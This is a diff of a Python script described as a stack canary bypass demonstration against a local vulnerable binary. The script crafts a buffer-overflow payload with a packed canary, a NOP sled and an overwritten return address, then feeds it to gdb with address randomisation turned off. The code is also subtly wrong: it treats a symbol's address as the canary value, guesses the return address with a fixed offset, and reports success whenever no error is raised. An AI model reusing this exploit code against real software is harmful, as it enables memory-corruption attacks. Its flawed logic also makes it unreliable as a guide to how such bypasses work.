@@ -1,52 +1,80 @@
-import os
-import pty
 import subprocess
+import os
 import struct
+import re
 
-# Define vulnerable binary path and GDB command
-BINARY = "./vulnerable_binary"
-GDB_COMMANDS = """
-set disable-randomization on
-break main
-run
-"""
+# Define path to the vulnerable binary
+BINARY_PATH = "./vulnerable_binary"
+
+def analyze_binary(binary_path):
+    """Analyze the binary to extract memory layout information using nm and objdump."""
+    nm_output = subprocess.check_output(['nm', binary_path]).decode()
+    objdump_output = subprocess.check_output(['objdump', '-d', binary_path]).decode()
+
+    canary_address = re.search(r'(\w+) B canary', nm_output)
+    buffer_address = re.search(r'(\w+) <vulnerable_function>:', objdump_output)
+
+    return canary_address.group(1), buffer_address.group(1)
 
 def create_payload(canary, return_address):
     """Create payload to bypass stack canary and overwrite return address."""
-    buffer_size = 64  # Example buffer size; adjust as per binary
+    buffer_size = 64  # Adjust buffer size as necessary
     nop_slide = b"\x90" * 16  # NOP sled for controlled execution
-    payload = b"A" * buffer_size  # Buffer overflow
-    payload += struct.pack("<I", canary)  # Preserve canary
+    payload = b"A" * buffer_size  # Fill buffer to overflow
+    payload += struct.pack("<I", canary)  # Pack the canary value
     payload += nop_slide
-    payload += struct.pack("<I", return_address)  # Overwrite return address
+    payload += struct.pack("<I", return_address)  # New return address
     return payload
 
-def interact_with_gdb():
-    """Interact with GDB to bypass stack canary."""
-    # Start GDB session
-    master, slave = pty.openpty()
-    gdb_process = subprocess.Popen(
-        ["gdb", BINARY], stdin=slave, stdout=slave, stderr=slave, text=True
-    )
-    os.write(master, GDB_COMMANDS.encode())
-    
-    # Extract canary and stack address
-    os.write(master, b"info proc mappings\n")
-    # Simulated analysis: Replace with actual GDB interaction
-    canary = 0xdeadbeef  # Example placeholder
-    return_address = 0x8048420  # Example placeholder
-    
-    # Create and inject payload
-    payload = create_payload(canary, return_address)
-    os.write(master, b"run < <(echo -e '{}')\n".format(payload.decode()))
-    os.write(master, b"continue\n")
+def gdb_auto_run(binary_path, payload):
+    """Automatically run gdb with the given payload."""
+    gdb_commands = f"""
+    set disable-randomization on
+    break vulnerable_function
+    run
+    """
+    gdb_script = "gdb_script.gdb"
+    with open(gdb_script, "w") as f:
+        f.write(gdb_commands)
 
-    # Terminate GDB session
-    gdb_process.terminate()
+    gdb_process = subprocess.Popen(['gdb', '-x', gdb_script, binary_path], stdin=subprocess.PIPE)
+    gdb_process.communicate(input=payload)
+    gdb_process.wait()
+    print("Check gdb for output")
+
+def visualize_memory_layout(canary, return_address):
+    """Create a simple ASCII art visualization of the memory layout."""
+    print(f"Memory Layout:\nCanary at: {canary}\nReturn address at: {return_address}")
+
+def test_payloads(payload_variants, binary_path):
+    """Test multiple payloads to find a successful exploit."""
+    for payload in payload_variants:
+        try:
+            result = gdb_auto_run(binary_path, payload)
+            print(f"Payload successful: {payload}")
+        except Exception as e:
+            print(f"Payload failed: {payload}\nError: {str(e)}")
 
 def main():
     print("Starting Stack Canary Bypass demonstration...")
-    interact_with_gdb()
+
+    # Extract addresses and values
+    canary, return_address = analyze_binary(BINARY_PATH)
+    canary = int(canary, 16)
+    return_address = int(return_address, 16) + 0x50  # Adjust this offset as needed
+
+    # Create the initial payload
+    payload = create_payload(canary, return_address)
+
+    # Visualize initial memory layout
+    visualize_memory_layout(canary, return_address)
+
+    # Interactive payload crafting (Optional)
+    # payload = interactive_exploit_session(payload)
+
+    # Test the payload
+    test_payloads([payload], BINARY_PATH)
+
     print("Exploit attempt completed. Check GDB output for details.")
 
 if __name__ == "__main__":
